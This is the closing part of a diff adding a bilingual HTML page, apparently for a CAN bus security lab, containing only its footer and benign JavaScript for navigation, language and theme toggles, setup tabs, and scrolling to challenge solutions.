+      </div>
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ SCRIPTS -->
+  <script>
+    // ── Page navigation ────────────────────────────────────────────────
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
+      document.getElementById('page-' + id).classList.add('active');
+      const navEl = document.getElementById('nav-' + id);
+      if (navEl) navEl.classList.add('active');
+      window.scrollTo(0, 0);
+      return false;
+    }
+
+    // ── Language toggle ────────────────────────────────────────────────
+    function setLang(lang) {
+      document.documentElement.setAttribute('data-lang', lang);
+      document.querySelectorAll('.lang-btn').forEach((btn, i) => {
+        btn.classList.toggle('active', (i === 0 && lang === 'en') || (i === 1 && lang === 'fr'));
+      });
+    }
+
+    // ── Dark / Light theme toggle ──────────────────────────────────────
+    function toggleTheme() {
+      const html = document.documentElement;
+      const btn = document.getElementById('theme-toggle');
+      const isLight = html.getAttribute('data-theme') === 'light';
+      if (isLight) {
+        html.removeAttribute('data-theme');
+        btn.textContent = '☀ Light';
+        localStorage.setItem('theme', 'dark');
+      } else {
+        html.setAttribute('data-theme', 'light');
+        btn.textContent = '◑ Dark';
+        localStorage.setItem('theme', 'light');
+      }
+    }
+
+    // Restore saved theme on load
+    (function () {
+      const saved = localStorage.getItem('theme');
+      if (saved === 'light') {
+        document.documentElement.setAttribute('data-theme', 'light');
+        document.addEventListener('DOMContentLoaded', () => {
+          const btn = document.getElementById('theme-toggle');
+          if (btn) btn.textContent = '◑ Dark';
+        });
+      }
+    })();
+
+    // ── Setup option tabs ──────────────────────────────────────────────
+    function switchTab(id) {
+      document.querySelectorAll('.option-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.option-panel').forEach(p => p.classList.remove('active'));
+      document.getElementById('tab-' + id).classList.add('active');
+      const tabs = document.querySelectorAll('.option-tab');
+      const idx = id === 'vm' ? 0 : 1;
+      tabs[idx].classList.add('active');
+    }
+
+    // ── Navigate to a specific solution ───────────────────────────────
+    function showSolution(challengeId) {
+      showPage('solutions');
+      setTimeout(() => {
+        const el = document.getElementById('sol-' + challengeId);
+        if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }, 60);
+    }
+  </script>
+</body>
+
+</html>
